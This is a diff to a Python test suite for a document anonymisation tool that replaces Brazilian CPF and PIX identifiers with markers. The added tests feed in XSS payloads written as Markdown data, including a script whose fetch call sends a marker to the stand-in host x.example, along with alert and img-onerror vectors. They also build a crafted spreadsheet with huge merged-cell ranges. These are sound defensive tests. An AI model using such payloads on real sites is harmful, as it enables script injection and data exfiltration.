@@ -600,12 +600,10 @@ class Arquivos(unittest.TestCase):
         self.assertTrue(any("HTML" in a for a in r["avisos"]), r["avisos"])
         with open(saida, encoding="utf-8") as f:
             out = f.read()
-        fora = out.replace("`<b>[CPF_1]</b>`", "").replace('<div class="x">[CPF_1]</div>', "")
-        for tag in ("<style", "<script", "<iframe", "<svg", "<math", "<template", "<img"):
-            self.assertNotIn(tag, fora, tag)
+        self.assertNotIn("<", out)
         self.assertIn("&lt;style>", out)
-        self.assertIn("`<b>[CPF_1]</b>`", out)           # código fica como estava (a proteção de tag mantém o marcador)
-        self.assertIn('<div class="x">[CPF_1]</div>', out)   # bloco de código também
+        self.assertIn("`&lt;b>[CPF_1]&lt;/b>`", out)           # dentro de código também: nada de < e o marcador não volta
+        self.assertIn('&lt;div class="x">[CPF_1]&lt;/div>', out)
         self.assertTrue(out.startswith("Dados: 52998224725"))
         self.assertTrue(out.endswith("Fim 52998224725."))
 
@@ -685,6 +683,54 @@ class Arquivos(unittest.TestCase):
         self.assertTrue(r["ok"], r)
         self.assert_limpo(os.path.join(self.saida, "doc-1.anon.docx"), ["123e4567-e89b-12d3-a456-426614174000"])
         self.assertIn("[PIX_1]", r["usados"])
+
+    def test_reverter_md_cerca_malformada_e_crase_escapada(self):
+        tabela = [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}]
+        casos = ["````\n```\n<script>fetch('//x.example/ [CPF_1]')</script>\n````\n",
+                 "```\ncodigo\n````\n<script>fetch('//x.example/ [CPF_1]')</script>\n",
+                 "\\`<script>alert(1)</script>\\`\n<img src=x onerror=alert(1)>`\n",
+                 "`` ` ``<script>x</script>`\n~~~\n<script>y</script>\n"]
+        for i, md in enumerate(casos):
+            saida = os.path.join(self.tmp, "m%d.md" % i)
+            r = motor.tratar({"op": "reverter", "entrada": self.arquivo("m%d.md" % i, md), "saida": saida, "tabela": tabela})
+            self.assertTrue(r["ok"], r)
+            with open(saida, encoding="utf-8") as f:
+                out = f.read()
+            self.assertNotIn("<", out, md)
+            self.assertNotIn("52998224725", out)   # em tag ou em código o marcador não volta
+
+    @unittest.skipUnless(tem("openpyxl"), "openpyxl não está instalado neste Python")
+    def test_mesclagem_gigante_recusada_antes_de_carregar(self):
+        import openpyxl
+        import time
+        wb = openpyxl.Workbook()
+        wb.active["A1"] = "x"
+        origem = os.path.join(self.tmp, "m.xlsx")
+        wb.save(origem)
+        injetado = os.path.join(self.tmp, "mm.xlsx")
+        with zipfile.ZipFile(origem) as zin, zipfile.ZipFile(injetado, "w") as zout:
+            for info in zin.infolist():
+                dados = zin.read(info.filename)
+                if info.filename == "xl/worksheets/sheet1.xml":
+                    dados = dados.replace(b"</worksheet>", b'<mergeCells count="1"><mergeCell ref="A1:ALL10000"/></mergeCells></worksheet>')
+                zout.writestr(info, dados)
+        self.assertLess(os.path.getsize(injetado), 5000)
+        t0 = time.time()
+        r = self.pedir(injetado)
+        self.assertEqual((r["ok"], r.get("codigo")), (False, "planilha_grande"), r)
+        r = motor.tratar({"op": "reverter", "entrada": injetado, "saida": os.path.join(self.tmp, "mm-out.xlsx"), "tabela": []})
+        self.assertEqual((r["ok"], r.get("codigo")), (False, "planilha_grande"), r)
+        self.assertLess(time.time() - t0, 10)
+        # várias mesclagens pequenas que somam demais também
+        muitas = os.path.join(self.tmp, "mm2.xlsx")
+        refs = b"".join(b'<mergeCell ref="A%d:Z%d"/>' % (i, i + 9999) for i in range(1, 200))
+        with zipfile.ZipFile(origem) as zin, zipfile.ZipFile(muitas, "w") as zout:
+            for info in zin.infolist():
+                dados = zin.read(info.filename)
+                if info.filename == "xl/worksheets/sheet1.xml":
+                    dados = dados.replace(b"</worksheet>", b"<mergeCells>" + refs + b"</mergeCells></worksheet>")
+                zout.writestr(info, dados)
+        self.assertEqual(self.pedir(muitas).get("codigo"), "planilha_grande")
 
     def test_pptx_reverter(self):
         slide = ('<?xml version="1.0"?><p:sld xmlns:a="a" xmlns:p="p"><a:p><a:r><a:t>Cliente [PESS</a:t></a:r>'
